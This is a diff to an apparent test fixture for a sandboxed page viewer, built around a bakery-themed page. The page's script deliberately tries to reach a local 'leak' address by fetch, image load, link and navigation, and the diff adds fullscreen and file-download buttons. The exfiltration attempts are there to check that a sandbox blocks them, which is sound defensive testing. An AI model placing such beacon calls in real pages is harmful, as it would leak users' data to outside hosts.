@@ -96,14 +96,22 @@ return { by, of, totals }`
 const spreadsheetScript = (name) => totalsScript(name).replace('return { by, of, totals }',
   "await tools.write({ name: 'Totals.xlsx', content: [[by, of], ...Object.entries(totals)].map((row) => row.join(',')).join('\\n') })\nreturn { by, of, totals }")
 const PLAN = '# Bakery plan\n\n1. Bake 120 croissants\n2. Deliver them\n\n| Day | Croissants |\n|---|---:|\n| Saturday | 120 |'
-/** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. */
+/** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. It can fill the screen and save its prices, by a link or from its code (D158). */
 const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p>
 <a id="away" href="http://127.0.0.1:4182/leak?link">Away</a> <button id="go">Go</button>
+<button id="big">Big</button> <a id="keep" download="Prices.csv" href="data:text/csv,Croissant%2C2">Keep</a> <button id="export">Export</button>
 <script>document.getElementById('out').textContent = 'Baked by a script ' + document.compatMode
 const leak = 'http://127.0.0.1:4182/leak?'
 fetch(leak + 'fetch').catch(() => {})
 new Image().src = leak + 'image'
-document.getElementById('go').onclick = () => { location.href = leak + 'navigate' }</script>`
+document.getElementById('go').onclick = () => { location.href = leak + 'navigate' }
+const out = (text) => { document.getElementById('out').textContent = text }
+document.getElementById('big').onclick = () => document.body.requestFullscreen().then(() => document.exitFullscreen()).then(() => out('Full screen'), (error) => out(error.name))
+document.getElementById('export').onclick = () => {
+  const link = Object.assign(document.createElement('a'), { href: URL.createObjectURL(new Blob(['{"croissant":2}'])), download: 'Prices.json' })
+  link.click()
+  URL.revokeObjectURL(link.href)
+}</script>`
 
 /** A small PNG: a warm gradient. */
 function picture(width = 96, height = 64) {
